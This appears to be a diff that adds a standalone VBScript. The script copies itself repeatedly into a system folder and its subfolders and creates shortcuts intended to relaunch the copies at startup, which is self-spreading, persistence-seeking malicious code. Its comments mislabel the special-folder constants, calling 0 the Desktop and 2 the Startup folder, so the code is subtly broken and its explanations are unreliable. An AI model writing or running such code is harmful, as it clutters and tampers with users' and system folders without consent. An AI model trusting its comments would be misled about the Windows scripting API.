@@ -1,0 +1,41 @@
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+strScriptPath = WScript.ScriptFullName
+
+' Specify the number of copies you want to create
+numCopies = 5
+
+For i = 1 To numCopies
+    strCopyPath = objFSO.GetParentFolderName(strScriptPath) & "\Copy" & i & ".vbs"
+    objFSO.CopyFile strScriptPath, strCopyPath
+
+    ' Get the path to the desktop folder
+    strDesktopFolder = objFSO.GetSpecialFolder(0) ' 0 represents the Desktop folder
+    
+    ' Create a copy of the script on the desktop
+    strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
+    objFSO.CopyFile strCopyPath, strDesktopCopyPath
+    
+    ' Get the list of folders on the desktop
+    Set objDesktopFolder = objFSO.GetFolder(strDesktopFolder)
+    Set colFolders = objDesktopFolder.SubFolders
+    
+    ' Iterate through each folder and create a copy of the script
+    For Each objFolder In colFolders
+        strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
+        objFSO.CopyFile strCopyPath, strFolderCopyPath
+    Next
+    
+    ' Get the path to the startup folder
+    strStartupFolder = objFSO.GetSpecialFolder(2) ' 2 represents the Startup folder
+    
+    ' Create a shortcut to the copied script in the startup folder for each folder on the desktop
+    For Each objFolder In colFolders
+        strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
+        strFolderShortcutPath = strStartupFolder & "\Copy" & i & "_" & objFSO.GetBaseName(objFolder) & ".lnk"
+        
+        Set objShell = CreateObject("WScript.Shell")
+        Set objShortcut = objShell.CreateShortcut(strFolderShortcutPath)
+        objShortcut.TargetPath = strFolderCopyPath
+        objShortcut.Save
+    Next
+Next
